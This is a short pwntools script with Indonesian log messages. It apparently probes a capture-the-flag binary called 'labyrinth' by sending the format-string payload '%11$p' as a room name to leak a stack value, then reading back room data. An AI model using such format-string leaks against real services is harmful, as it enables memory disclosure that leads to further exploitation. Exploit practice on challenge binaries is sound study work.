from pwn import *

context.log_level = "debug"
context.timeout = 3

io = process("./labyrinth")


def expect(delimiter, stage):
    log.info(f"Menunggu: {stage}")

    data = io.recvuntil(delimiter, timeout=3)

    if not data.endswith(delimiter):
        log.failure(f"Timeout pada tahap: {stage}")
        print(f"Data yang diterima: {data!r}")
        print(f"Sisa output: {io.clean(timeout=0.2)!r}")
        io.close()
        raise SystemExit(1)

    log.success(f"Berhasil: {stage}")
    print(f"Output: {data[-150:]!r}", flush=True)
    return data


expect(b"> ", "menu awal")
io.sendline(b"explore")

expect(b"Room name: ", "prompt nama room")
io.sendline(b"%11$p")

expect(b"Room size: ", "prompt ukuran room")
io.sendline(b"32")

expect(b"> ", "menu setelah membuat room")
io.sendline(b"look")

expect(b"Room ID: ", "prompt ID room")
io.sendline(b"0")

header = expect(b"Room data: ", "header hasil look")
print(f"Header look: {header!r}", flush=True)

data = io.recvn(32, timeout=3)

if len(data) != 32:
    log.failure(f"Data room tidak lengkap: {len(data)}/32 byte")
    print(repr(data))
    io.close()
    raise SystemExit(1)

print(f"Data room (32 byte): {data!r}", flush=True)

tail = expect(b"> ", "menu setelah look")
print(f"Output lanjutan: {tail!r}", flush=True)

io.close()
